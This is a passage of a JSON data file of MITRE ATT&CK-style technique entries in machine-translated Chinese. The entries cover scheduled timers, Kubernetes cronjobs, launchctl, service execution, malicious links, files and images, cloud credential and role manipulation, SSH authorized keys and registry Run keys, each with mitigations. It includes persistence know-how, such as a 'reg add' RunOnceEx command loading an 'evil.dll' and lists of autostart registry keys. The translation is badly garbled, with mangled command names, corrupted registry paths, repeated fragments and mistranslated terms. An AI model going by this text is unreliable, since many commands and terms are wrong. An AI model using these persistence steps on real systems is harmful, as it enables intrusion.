        },
        {
          "type": "text",
          "content": "时，用户级别写入"
        },
        {
          "type": "code",
          "content": "〜/.config/systemd/用户/"
        },
        {
          "type": "text",
          "content": "。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可以使用SystemD计时器在系统启动或计划的基础上执行恶意代码。使用特权路径安装的计时器可用于维持根级持久性。对手也可以安装用户级计时器以实现用户级别的持久性。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1026",
        "name": "特权帐户管理",
        "description": [
          [
            {
              "type": "text",
              "content": "限制对根帐户的访问，并防止用户创建和/或修改SystemD Timer单元文件。"
            }
          ]
        ]
      },
      {
        "id": "M1022",
        "name": "限制文件和目录权限",
        "description": [
          [
            {
              "type": "text",
              "content": "限制对SystemD "
            },
            {
              "type": "code",
              "content": " .timer "
            },
            {
              "type": "text",
              "content": "单元文件的读/写入访问仅选择有合法需要管理系统服务的特权用户。"
            }
          ]
        ]
      },
      {
        "id": "M1018",
        "name": "用户帐户管理",
        "description": [
          [
            {
              "type": "text",
              "content": "将对系统实用程序（例如“ SystemCtl”或“ SystemD-run””等系统实用程序的访问限制为有合法需求的用户。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1053.007",
    "name": "Container Orchestration Job",
    "tactics": [
      {
        "id": "TA0002",
        "name": "Execution"
      },
      {
        "id": "TA0003",
        "name": "Persistence"
      },
      {
        "id": "TA0004",
        "name": "Privilege Escalation"
      }
    ],
    "technique": "Scheduled Task/Job",
    "version": "1.3",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会滥用由容器编排工具（例如Kubernetes）提供的任务调度功能，以安排配置为执行恶意代码的容器的部署。集装箱编排作业在特定的日期和时间运行这些自动任务，类似于Linux系统上的Cron作业。此类型的部署也可以配置为随着时间的推移维护数量的容器，从而自动化了在集群中保持持久性的过程。"
        }
      ],
      [
        {
          "type": "text",
          "content": "在Kubernetes中，可以使用Cronjob来安排运行一个或多个容器以执行特定任务的作业。因此，对手可以利用cronjob安排在集群中各个节点中执行恶意代码的作业部署。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1026",
        "name": "特权帐户管理",
        "description": [
          [
            {
              "type": "text",
              "content": "确保默认情况下的容器不作为根。在Kubernetes环境中，考虑定义POD安全标准，以防止POD运行特权容器。"
            }
          ]
        ]
      },
      {
        "id": "M1018",
        "name": "用户帐户管理",
        "description": [
          [
            {
              "type": "text",
              "content": "限制用户帐户的特权并补充特权升级向量，因此只有授权的管理员才能创建集装箱编排作业。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1569.001",
    "name": "Launchctl",
    "tactics": [
      {
        "id": "TA0002",
        "name": "Execution"
      }
    ],
    "technique": "System Services",
    "version": "1.1",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会滥用启动CTCTL执行命令或程序。启动CTCL与MACOS的服务管理框架启动界面接口。LaunchCtl支持在命令行上进行子命令，交互式甚至从标准输入中重定向。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手使用LaunchCtl执行命令和程序作为发射代理或发射守护程序。常见子命令包括："
        },
        {
          "type": "code",
          "content": " auginderctl load "
        },
        {
          "type": "text",
          "content": "，"
        },
        {
          "type": "code",
          "content": " aunpentctl unload "
        },
        {
          "type": "text",
          "content": "和"
        },
        {
          "type": "code",
          "content": " aunpentctl startl start "
        },
        {
          "type": "text",
          "content": "。对手可以使用脚本或手动运行命令"
        },
        {
          "type": "code",
          "content": " lainingctl load -w“％s/library/launchagents/％s” "
        },
        {
          "type": "text",
          "content": "或</code>/bin/binationctl load </code>执行启动代理守护程序。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1018",
        "name": "用户帐户管理",
        "description": [
          [
            {
              "type": "text",
              "content": "防止用户安装自己的发射代理或发射守护程序。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1569.002",
    "name": "Service Execution",
    "tactics": [
      {
        "id": "TA0002",
        "name": "Execution"
      }
    ],
    "technique": "System Services",
    "version": "1.2",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会滥用Windows服务控制经理以执行恶意命令或有效载荷。Windows Service Control Manager（"
        },
        {
          "type": "code",
          "content": " services.exe "
        },
        {
          "type": "text",
          "content": "）是管理和操纵服务的接口。用户可以通过GUI组件以及系统实用程序（例如"
        },
        {
          "type": "code",
          "content": " sc.exe "
        },
        {
          "type": "text",
          "content": "和NET）访问服务控制管理器。"
        }
      ],
      [
        {
          "type": "text",
          "content": "PSEXEC还可以通过通过服务控制管理器API创建的临时Windows服务来执行命令或有效载荷。诸如PSEXEC和"
        },
        {
          "type": "code",
          "content": " sc.exe "
        },
        {
          "type": "text",
          "content": "之类的工具可以接受远程服务器作为参数，可用于进行远程执行。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可能会利用这些机制执行恶意内容。这可以通过执行新的或修改后的服务来完成。此技术是在服务持续或特权升级期间与Windows服务一起使用的执行。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1040",
        "name": "预防端点的行为",
        "description": [
          [
            {
              "type": "text",
              "content": "在Windows 10上，启用攻击表面减少（ASR）规则以阻止PSEXEC从运行中创建的过程。"
            }
          ]
        ]
      },
      {
        "id": "M1026",
        "name": "特权帐户管理",
        "description": [
          [
            {
              "type": "text",
              "content": "确保权限禁止在较高的权限级别运行的服务，从而无法由较低许可级别的用户创建或与之互动。"
            }
          ]
        ]
      },
      {
        "id": "M1022",
        "name": "限制文件和目录权限",
        "description": [
          [
            {
              "type": "text",
              "content": "确保用户以较低的权限级别替换或修改高的许可级服务二进制文件。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1204.001",
    "name": "Malicious Link",
    "tactics": [
      {
        "id": "TA0002",
        "name": "Execution"
      }
    ],
    "technique": "User Execution",
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以依靠单击恶意链接的用户为了获得执行。用户可能会受到社会工程的影响，以使他们单击将导致代码执行的链接。该用户操作通常会被视为来自矛盾链接的后续行为。单击链接也可能导致其他执行技术，例如通过利用客户执行来剥削浏览器或应用程序漏洞。链接还可能导致用户下载需要通过恶意文件执行的文件。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1031",
        "name": "网络入侵预防",
        "description": [
          [
            {
              "type": "text",
              "content": "如果用户正在访问链接，则可以使用旨在扫描和删除恶意下载的网络入侵系统和系统来阻止活动。"
            }
          ]
        ]
      },
      {
        "id": "M1021",
        "name": "限制基于Web的内容",
        "description": [
          [
            {
              "type": "text",
              "content": "如果用户访问了链接，则默认情况下不应下载或通过可疑网站下载策略的未知文件或未使用的文件，以防止某些向量，例如.scr，.exe，.pif，.pif，.pif，.pif，.pif，.pif，.pif，.pif，.pif，.cpl等。一些下载扫描设备可以打开并分析压缩和加密格式，例如zip和rar，可用于隐藏恶意文件。"
            }
          ]
        ]
      },
      {
        "id": "M1017",
        "name": "用户培训",
        "description": [
          [
            {
              "type": "text",
              "content": "使用用户培训作为一种对常见的网络钓鱼和矛盾技术的认识，以及如何引起对潜在恶意事件的怀疑。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1204.002",
    "name": "Malicious File",
    "tactics": [
      {
        "id": "TA0002",
        "name": "Execution"
      }
    ],
    "technique": "User Execution",
    "version": "1.3",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以依靠打开恶意文件以获得执行的用户。用户可能会受到社会工程的影响，以使他们打开一个将导致代码执行的文件。通常将这种用户动作视为矛盾附件的后续行为。对手可能会使用几种要求用户执行它们的文件，包括.doc，.pdf，.xls，.rtf，.scr，.exe，.lnk，.pif，.pif，.pif和.cpl。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可以采用各种形式的伪装和混淆文件或信息来增加用户打开并成功执行恶意文件的可能性。这些方法可能包括使用熟悉的命名约定和/或密码保护文件并向用户提供有关如何打开其的说明。"
        }
      ],
      [
        {
          "type": "text",
          "content": "虽然恶意文件在初次访问后经常发生，但可能会发生在入侵的其他阶段，例如当对手将文件放在共享目录中或用户桌面上时，希望用户能单击它。内部矛盾后不久也可以看到此活动。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1040",
        "name": "预防端点的行为",
        "description": [
          [
            {
              "type": "text",
              "content": "在Windows 10上，可以启用各种攻击表面降低（ASR）规则，以防止执行潜在的恶意可执行文件（例如已通过Office Applications/Scripping口译员/电子邮件客户端下载和执行的文件或不符合特定流行的文件。，年龄或值得信赖的列表标准）。注意：必须针对某些规则启用云交换保护。"
            }
          ]
        ]
      },
      {
        "id": "M1038",
        "name": "预防执行",
        "description": [
          [
            {
              "type": "text",
              "content": "应用程序控件可能能够防止伪装成其他文件的可执行文件运行。"
            }
          ]
        ]
      },
      {
        "id": "M1017",
        "name": "用户培训",
        "description": [
          [
            {
              "type": "text",
              "content": "使用用户培训作为一种对常见的网络钓鱼和矛盾技术的认识，以及如何引起对潜在恶意事件的怀疑。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1204.003",
    "name": "Malicious Image",
    "tactics": [
      {
        "id": "TA0002",
        "name": "Execution"
      }
    ],
    "technique": "User Execution",
    "version": "1.1",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以依靠运行恶意图像的用户来促进执行。亚马逊Web服务（AWS）Amazon Machine Images（AMIS），Google Cloud Platform（GCP）图像以及Azure Images以及流行的集装箱Runtimes（例如Docker）。可以通过上传恶意软件上传后的图像可以上传到公共存储库，然后用户可以从图像中下载并部署实例或容器，而无需意识到图像是恶意的，因此绕过专门实现初始访问的技术。这可能导致执行恶意代码，例如在实例或容器中执行加密货币挖掘的代码。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手还可以以某种方式命名图像，以增加用户错误地从图像中部署实例或容器的机会（例如：匹配合法名称或位置）。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1047",
        "name": "审计",
        "description": [
          [
            {
              "type": "text",
              "content": "审核图像部署在环境中，以确保它们不包含任何恶意组件。"
            }
          ]
        ]
      },
      {
        "id": "M1045",
        "name": "代码签名",
        "description": [
          [
            {
              "type": "text",
              "content": "利用具有数字签名的Docker Content Trust之类的信任模型来确保对特定图像标签的完整性和发布者的运行时验证。"
            }
          ]
        ]
      },
      {
        "id": "M1031",
        "name": "网络入侵预防",
        "description": [
          [
            {
              "type": "text",
              "content": "用于扫描和删除恶意下载的网络预防入侵系统和系统可用于阻止活动。"
            }
          ]
        ]
      },
      {
        "id": "M1017",
        "name": "用户培训",
        "description": [
          [
            {
              "type": "text",
              "content": "培训用户了解恶意图像的存在，以及如何避免从中部署实例和容器。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1098.001",
    "name": "Additional Cloud Credentials",
    "tactics": [
      {
        "id": "TA0003",
        "name": "Persistence"
      },
      {
        "id": "TA0004",
        "name": "Privilege Escalation"
      }
    ],
    "technique": "Account Manipulation",
    "version": "2.6",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会将对手控制的凭据添加到云帐户中，以维持对受害者帐户和环境中实例的持续访问。"
        }
      ],
      [
        {
          "type": "text",
          "content": "例如，除了Azure AD中的现有合法证书外，对手还可以为服务原理和应用程序添加凭据。这些凭据包括X509密钥和密码。有了足够的权限，有多种方法可以添加凭据，包括Azure Portal，Azure命令行接口和Azure或Az PowerShell模块。"
        }
      ],
      [
        {
          "type": "text",
          "content": "在基础架构-AS-A-Service（IAAS）环境中，在通过云帐户获得访问权限后，对手可以使用"
        },
        {
          "type": "code",
          "content": " create> create> create> createkeypair "
        },
        {
          "type": "text",
          "content": "或"
        },
        {
          "type": "code",
          "content": " import> import> import> import> api生成或导入自己的SSH键。在AWS或 GCLOUD计算OS-LOGIN SSH-KEYS中添加"
        },
        {
          "type": "text",
          "content": "命令在GCP中。这允许在云环境中持续访问实例，而无需进一步使用受损的云帐户。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手也可以在AWS中使用"
        },
        {
          "type": "code",
          "content": " createAccesskey "
        },
        {
          "type": "text",
          "content": " api，或者"
        },
        {
          "type": "code",
          "content": " gcloud IAM service-accounts键keys create "
        },
        {
          "type": "text",
          "content": " gcp中的命令将访问键添加到帐户中。如果目标帐户与请求帐户具有不同的权限，则对手也可以在环境中升级其特权（即云帐户）。例如，在Azure AD环境中，具有应用程序管理员角色的对手可以为其应用程序的服务主体添加一组新的凭据。为此，对手将能够访问服务主体的角色和权限，这可能与应用程序管理员的角色和权限不同。"
        }
      ],
      [
        {
          "type": "text",
          "content": "在AWS环境中，具有适当权限的对手也可以使用"
        },
        {
          "type": "code",
          "content": " sts：getFederationToken "
        },
        {
          "type": "text",
          "content": " api调用来创建与原始用户帐户权限有关的临时凭据集。即使原始帐户的API凭据被停用，这些凭证在其一生的持续时间内也可能仍然有效。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1032",
        "name": "多因素身份验证",
        "description": [
          [
            {
              "type": "text",
              "content": "为用户和特权帐户使用多因素身份验证。考虑通过IAM策略执行"
            },
            {
              "type": "code",
              "content": " createKeypair "
            },
            {
              "type": "text",
              "content": "和"
            },
            {
              "type": "code",
              "content": " import> API调用的 createKeypair "
            },
            {
              "type": "text",
              "content": "的多因素身份验证。"
            }
          ]
        ]
      },
      {
        "id": "M1030",
        "name": "网络细分",
        "description": [
          [
            {
              "type": "text",
              "content": "配置访问控件和防火墙，以限制对关键系统和域控制器的访问。大多数云环境都支持单独的虚拟私有云（VPC）实例，以进一步分割云系统。"
            }
          ]
        ]
      },
      {
        "id": "M1026",
        "name": "特权帐户管理",
        "description": [
          [
            {
              "type": "text",
              "content": "请勿将域管理员或根帐户用于日常操作，这些操作可能会使它们暴露于无私人系统上的潜在对手。"
            }
          ]
        ]
      },
      {
        "id": "M1018",
        "name": "用户帐户管理",
        "description": [
          [
            {
              "type": "text",
              "content": "确保低调的用户帐户无权将访问密钥添加到帐户中。在AWS环境中，除非明确要求，否则禁止用户调用"
            },
            {
              "type": "code",
              "content": " sts：getFederationToken "
            },
            {
              "type": "text",
              "content": " api。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1098.002",
    "name": "Additional Email Delegate Permissions",
    "tactics": [
      {
        "id": "TA0003",
        "name": "Persistence"
      },
      {
        "id": "TA0004",
        "name": "Privilege Escalation"
      }
    ],
    "technique": "Account Manipulation",
    "version": "2.1",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以授予额外的许可级别，以维持对对手控制的电子邮件帐户的持续访问。"
        }
      ],
      [
        {
          "type": "text",
          "content": "例如，"
        },
        {
          "type": "code",
          "content": " add-mailboxpermission "
        },
        {
          "type": "text",
          "content": " powershell cmdlet，可在本地交易所和基于云的服务Office 365中获得，将权限添加到邮箱中。在Google Workspace中，可以通过Google Admin控制台启用委托，用户可以通过其Gmail设置委派帐户。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手还可以通过单个文件夹权限或角色分配邮箱文件夹权限。在Office 365环境中，对手可以将默认或匿名用户权限或角色分配给信息商店顶部（root），收件箱或其他邮箱文件夹。通过将一个或两个用户权限分配给文件夹，对手可以利用租户中的任何其他帐户来维持目标用户邮件文件夹的持久性。"
        }
      ],
      [
        {
          "type": "text",
          "content": "这可以用于持续的威胁事件以及BEC（业务电子邮件妥协）事件中，对手可以在他们希望妥协的帐户中添加其他云角色。这可能会进一步实现其他技术来获得系统的访问。例如，妥协的业务帐户通常用于在创建收件箱规则（例如：内部矛盾）的同时，将消息发送到目标业务网络中的其他帐户，因此消息逃避垃圾邮件/网络钓鱼检测机制。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1042",
        "name": "禁用或删除功能或程序",
        "description": [
          [
            {
              "type": "text",
              "content": "如果不需要电子邮件委托，请禁用它。在Google Workspace中，这可以通过Google Admin Console来完成。"
            }
          ]
        ]
      },
      {
        "id": "M1032",
        "name": "多因素身份验证",
        "description": [
          [
            {
              "type": "text",
              "content": "为用户和特权帐户使用多因素身份验证。"
            }
          ]
        ]
      },
      {
        "id": "M1026",
        "name": "特权帐户管理",
        "description": [
          [
            {
              "type": "text",
              "content": "请勿将域管理员帐户用于日常操作，这可能会使它们暴露于无私人系统上的潜在对手。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1098.003",
    "name": "Additional Cloud Roles",
    "tactics": [
      {
        "id": "TA0003",
        "name": "Persistence"
      },
      {
        "id": "TA0004",
        "name": "Privilege Escalation"
      }
    ],
    "technique": "Account Manipulation",
    "version": "2.3",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以在对手控制的云帐户中添加其他角色或权限，以维持对租户的持续访问。例如，对手可能会在基于云的环境中更新IAM策略，或在Office 365环境中添加新的全局管理员。有了足够的权限，折衷的帐户几乎可以无限制地访问数据和设置（包括重置其他管理员的密码的能力）。"
        }
      ],
      [
        {
          "type": "text",
          "content": "此帐户修改可能会立即遵循创建帐户或其他恶意帐户活动。对手还可以修改其妥协的现有有效帐户。这可能会导致特权升级，特别是如果添加的角色允许向其他帐户进行横向移动。"
        }
      ],
      [
        {
          "type": "text",
          "content": "例如，在AWS环境中，具有适当权限的对手可以使用"
        },
        {
          "type": "code",
          "content": " createPolicyVersion "
        },
        {
          "type": "text",
          "content": " api来定义IAM策略的新版本或"
        },
        {
          "type": "code",
          "content": " eatheruserpolicy "
        },
        {
          "type": "text",
          "content": " apiIAM策略，具有折衷的用户帐户的其他权限或不同的权限。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1032",
        "name": "多因素身份验证",
        "description": [
          [
            {
              "type": "text",
              "content": "为用户和特权帐户使用多因素身份验证。"
            }
          ]
        ]
      },
      {
        "id": "M1026",
        "name": "特权帐户管理",
        "description": [
          [
            {
              "type": "text",
              "content": "确保所有帐户都使用他们需要的最低特权。在Azure AD环境中，请考虑使用特权身份管理（PIM）来定义在分配给用户之前需要两个或更多批准的角色。"
            }
          ]
        ]
      },
      {
        "id": "M1018",
        "name": "用户帐户管理",
        "description": [
          [
            {
              "type": "text",
              "content": "确保低调的用户帐户没有权限可以在帐户中添加权限或更新IAM策略。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1098.004",
    "name": "SSH Authorized Keys",
    "tactics": [
      {
        "id": "TA0003",
        "name": "Persistence"
      },
      {
        "id": "TA0004",
        "name": "Privilege Escalation"
      }
    ],
    "technique": "Account Manipulation",
    "version": "1.3",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以修改SSH "
        },
        {
          "type": "code",
          "content": "授权"
        },
        {
          "type": "text",
          "content": "文件以保持受害者主机上的持久性。Linux发行版和MACO通常使用基于密钥的身份验证来确保远程管理的SSH会话的身份验证过程。SSH中的"
        },
        {
          "type": "code",
          "content": "授权"
        },
        {
          "type": "text",
          "content": "文件指定可用于登录文件的用户帐户的SSH键。该文件通常在用户的主目录中找到，"
        },
        {
          "type": "code",
          "content": " <用户 - 家庭>/。ssh/euthoritied_keys "
        },
        {
          "type": "text",
          "content": "。用户可以编辑系统的SSH配置文件，以将指令PubKeyAuthentication和RSAAuthentication修改为“是”的值，以确保启用公共密钥和RSA身份验证。SSH配置文件通常位于"
        },
        {
          "type": "code",
          "content": "/etc/ssss/sshd_config "
        },
        {
          "type": "text",
          "content": "下。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可以直接使用脚本或shell命令来修改ssh "
        },
        {
          "type": "code",
          "content": "授权> "
        },
        {
          "type": "text",
          "content": "文件，以添加自己的对手支持的公共密钥。在云环境中，对手可能能够通过命令行接口或REST API修改特定虚拟机的SSH授权_Keys文件。例如，通过使用Google Cloud CLI的“ Add-Metadata”命令，对手可能会将SSH键添加到用户帐户中。同样，在Azure中，对手可以通过补丁请求对API更新虚拟机的授权_keys文件。这样可以确保拥有相应的私钥的对手可以通过SSH作为现有用户登录。它也可能导致特权升级，即虚拟机或实例具有与请求用户不同的权限。"
        }
      ],
      [
        {
          "type": "text",
          "content": "如果通过云API或命令行接口修改了授权_keys文件，则如果对较高私密的用户添加键，则对手可能会在目标虚拟机上实现特权升级。"
        }
      ],
      [
        {
          "type": "text",
          "content": "SSH键也可以添加到网络设备上的帐户中，例如使用"
        },
        {
          "type": "code",
          "content": " IP SSH PubKey-Chain "
        },
        {
          "type": "text",
          "content": "网络设备CLI命令。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1042",
        "name": "禁用或删除功能或程序",
        "description": [
          [
            {
              "type": "text",
              "content": "禁用SSH，如果在主机上不需要使用"
            },
            {
              "type": "code",
              "content": "/etc/etcs/ssh/sshd_config "
            },
            {
              "type": "text",
              "content": "限制特定用户/组的SSH访问。"
            }
          ]
        ]
      },
      {
        "id": "M1022",
        "name": "限制文件和目录权限",
        "description": [
          [
            {
              "type": "text",
              "content": "限制访问"
            },
            {
              "type": "code",
              "content": "授权> keys "
            },
            {
              "type": "text",
              "content": "文件。"
            }
          ]
        ]
      },
      {
        "id": "M1018",
        "name": "用户帐户管理",
        "description": [
          [
            {
              "type": "text",
              "content": "在云环境中，确保只有明确要求权限更新实例元数据或配置的用户才能做到这一点。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1098.005",
    "name": "Device Registration",
    "tactics": [
      {
        "id": "TA0003",
        "name": "Persistence"
      },
      {
        "id": "TA0004",
        "name": "Privilege Escalation"
      }
    ],
    "technique": "Account Manipulation",
    "version": "1.2",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以将设备注册到对手控制的帐户中。设备可以在多因素身份验证（MFA）系统中注册，该系统处理网络的身份验证，也可以在设备管理系统（处理设备访问和合规性）中注册。"
        }
      ],
      [
        {
          "type": "text",
          "content": "MFA系统（例如Duo或Okta）允许用户将设备与其帐户相关联，以完成MFA要求。损害用户凭据的对手可以注册新设备，以绕过初始的MFA要求并获得对网络的持续访问。在某些情况下，MFA自我注册过程可能仅需要一个用户名和密码来注册该帐户的第一个设备或将设备注册到非活动帐户中。"
        }
      ],
      [
        {
          "type": "text",
          "content": "同样，现有访问网络的对手可以将设备注册到Azure AD和/或其设备管理系统Microsoft Intune，以便访问敏感数据或资源，同时绕过条件访问策略。"
        }
      ],
      [
        {
          "type": "text",
          "content": "在Azure AD中注册的设备可能能够通过组织内的电子邮件进行内部矛盾的活动，这些电子邮件不太可能被电子邮件客户端视为可疑。此外，对手可能能够通过注册大量设备来对Azure AD租户进行服务耗尽洪水。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1032",
        "name": "多因素身份验证",
        "description": [
          [
            {
              "type": "text",
              "content": "需要多因素身份验证才能在Azure AD中注册设备。配置多因素身份验证系统，以不允许注册非活动帐户的新设备。首次注册MFA时，请使用条件访问策略将设备注册限制为受信任的位置或设备，并考虑使用临时访问通行证作为初始MFA解决方案来注册设备。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1098.006",
    "name": "Additional Container Cluster Roles",
    "tactics": [
      {
        "id": "TA0003",
        "name": "Persistence"
      },
      {
        "id": "TA0004",
        "name": "Privilege Escalation"
      }
    ],
    "technique": "Account Manipulation",
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以向对手控制的用户或服务帐户添加其他角色或权限，以维持对容器编排系统的持续访问。例如，具有足够权限的对手可能会创建角色饰面或聚合气结，以将角色或聚类的簇绑定到Kubernetes帐户。在使用基于属性的访问控制（ABAC）的情况下，具有足够权限的对手可能会修改Kubernetes ABAC策略，以赋予目标帐户额外的权限。"
        }
      ],
      [
        {
          "type": "text",
          "content": "此帐户修改可能会立即遵循创建帐户或其他恶意帐户活动。对手还可以修改其妥协的现有有效帐户。"
        }
      ],
      [
        {
          "type": "text",
          "content": "请注意，在云环境中部署集装箱编排系统的地方，就像Google Kubernetes引擎，Amazon Elastic Kubernetes服务和Azure Kubernetes服务一样，基于云的基于云的基于角色的访问控制（RBAC）作业或ABAC策略通常可以代替或除本地许可分配外。在这些情况下，该技术可以与其他云角色结合使用。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1032",
        "name": "多因素身份验证",
        "description": [
          [
            {
              "type": "text",
              "content": "需要通过云部署或通过诸如LDAP或SAML等身份验证协议集成到容器集群中的用户帐户多因素身份验证。"
            }
          ]
        ]
      },
      {
        "id": "M1018",
        "name": "用户帐户管理",
        "description": [
          [
            {
              "type": "text",
              "content": "确保低调帐户没有权限可以在帐户中添加权限或更新容器集群角色。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1547.001",
    "name": "Registry Run Keys / Startup Folder",
    "tactics": [
      {
        "id": "TA0003",
        "name": "Persistence"
      },
      {
        "id": "TA0004",
        "name": "Privilege Escalation"
      }
    ],
    "technique": "Boot or Logon Autostart Execution",
    "version": "2.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以通过在启动文件夹中添加程序或使用注册表运行键来实现持久性。在注册表或“启动文件夹”中的“运行密钥”中添加条目将导致用户登录时所引用的程序执行。这些程序将在用户的上下文中执行，并具有帐户的关联权限级别。"
        }
      ],
      [
        {
          "type": "text",
          "content": "默认在Windows系统上创建以下运行键："
        }
      ],
      [
        {
          "type": "list",
          "content": "hkey_current_user \\ Software \\ Microsoft \\ Windows \\ CurrentVersion \\ Run"
        },
        {
          "type": "list",
          "content": "hkey_current_user \\ software \\ Microsoft \\ Windows \\ CurrentVersion \\ Runonce"
        },
        {
          "type": "list",
          "content": "HKEY_LOCAL_MACHINE \\ SOFTWORD \\ MICROSOFT \\ WINDOWS \\ CurrentVersion \\ Run"
        },
        {
          "type": "list",
          "content": "hkey_local_machine \\ software \\ Microsoft \\ Windows \\ Currentversion \\ Runonce"
        }
      ],
      [
        {
          "type": "text",
          "content": "运行键可能存在于多个蜂箱下。"
        },
        {
          "type": "code",
          "content": " HKEY_LOCAL_MACHINE \\ SOFTWORT \\ MICROSOFT \\ WINDOWS \\ CurrentVersion \\ Runonceex "
        },
        {
          "type": "text",
          "content": "也可用，但默认情况下未在Windows Vista上创建。注册表运行密钥条目可以直接引用程序或将其列为依赖项。例如，可以使用runonceex使用“依赖”键在登录处加载dll："
        },
        {
          "type": "code",
          "content": " reg添加hklm \\ software \\ microsoft \\ microsoft \\ windows \\ currentversion \\ runonceex \\ 0001 \\ 0001 \\ dived /v 1 /v 1 /d“ c：\\ \\ \\ \\临时\\邪恶[。] dll“ "
        },
        {
          "type": "text",
          "content": ""
        }
      ],
      [
        {
          "type": "text",
          "content": "将程序放置在启动文件夹中还将导致该程序在用户登录时执行。单个用户帐户以及系统范围的启动文件夹都有一个启动文件夹位置，无论哪个用户帐户在哪个中登录，都将被检查。。当前用户的启动文件夹路径是"
        },
        {
          "type": "code",
          "content": " c：\\ users \\ [username] \\ appdata \\ roaming \\ Microsoft \\ Microsoft \\ Windows \\ Windows \\ start菜单\\ start菜单\\ program \\ program \\ startup </code "
        },
        {
          "type": "text",
          "content": "。所有用户的启动文件夹路径均为"
        },
        {
          "type": "code",
          "content": " c：\\ programData \\ Microsoft \\ Windows \\ Windows \\ Start Menu \\ Program \\ Program \\ Program \\ startup "
        },
        {
          "type": "text",
          "content": "。"
        }
      ],
      [
        {
          "type": "text",
          "content": "以下注册表密钥可用于设置启动文件夹项目以持续："
        }
      ],
      [
        {
          "type": "list",
          "content": "hkey_current_user \\ Software \\ Microsoft \\ Windows \\ CurrentVersion \\ Explorer \\ User Shell文件夹"
        },
        {
          "type": "list",
          "content": "hkey_current_user \\ software \\ Microsoft \\ Windows \\ currentversion \\ explorer \\ shell文件夹"
        },
        {
          "type": "list",
          "content": "HKEY_LOCAL_MACHINE \\ SOFTWORD \\ MICROSOFT \\ WINDOWS \\ CurrentVersion \\ Explorer \\ Shell文件夹"
        },
        {
          "type": "list",
          "content": "HKEY_LOCAL_MACHINE \\ SOFTWORD \\ MICROSOFT \\ WINDOWS \\ CurrentVersion \\ Explorer \\ User Shell文件夹"
        }
      ],
      [
        {
          "type": "text",
          "content": "以下注册表密钥可以在引导过程中控制自动启动服务："
        }
      ],
      [
        {
          "type": "list",
          "content": "hkey_local_machine \\ Software \\ Microsoft \\ Windows \\ CurrentVersion \\ RunservicesOnce"
        },
        {
          "type": "list",
          "content": "hkey_current_user \\ software \\ Microsoft \\ Windows \\ CurrentVersion \\ RunservicesOnce"
        },
        {
          "type": "list",
          "content": "HKEY_LOCAL_MACHINE \\ SOFTWORD \\ MICROSOFT \\ WINDOWS \\ CurrentVersion \\ RunServices"
        },
        {
          "type": "list",
          "content": "hkey_current_user \\ software \\ Microsoft \\ Windows \\ CurrentVersion \\ RunServices"
        }
      ],
      [
        {
          "type": "text",
          "content": "使用策略设置指定启动程序在两个注册表中的任何一个中创建相应的值："
        }
      ],
      [
        {
          "type": "list",
          "content": "HKEY_LOCAL_MACHINE \\ SOFTWORD \\ MICROSOFT \\ WINDOWS \\ CurrentVersion \\ Policies \\ Explorer \\ Run"
        },
        {
          "type": "list",
          "content": "hkey_current_user \\ software \\ Microsoft \\ Windows \\ CurrentVersion \\ Policies \\ Explorer \\ Run"
        }
      ],
      [
        {
          "type": "text",
          "content": "注册表密钥<Code> HKEY_CURRENT_USER \\ SOFTWORN \\ MICROSOFT \\ WINDOWS NT \\ CurrentVersion \\ Windows \\ Windows </code </code </code </code </code </code </code </code>自动为当前记录的用户运行。"
        }
      ],
      [
        {
          "type": "text",
          "content": "默认情况下，多施加"
        },
        {
          "type": "code",
          "content": " bootexecute "
        },
        {
          "type": "text",
          "content": "注册表密钥的值"
        },
        {
          "type": "code",
          "content": " hkey_local_machine \\ system \\ currentcontrolset \\ control \\ control \\ control \\ session </code </code "
        },
        {
          "type": "text",
          "content": "设置为"
        },
        {
          "type": "code",
          "content": " autocheck autocheck autochk *"
        },
        {
          "type": "text",
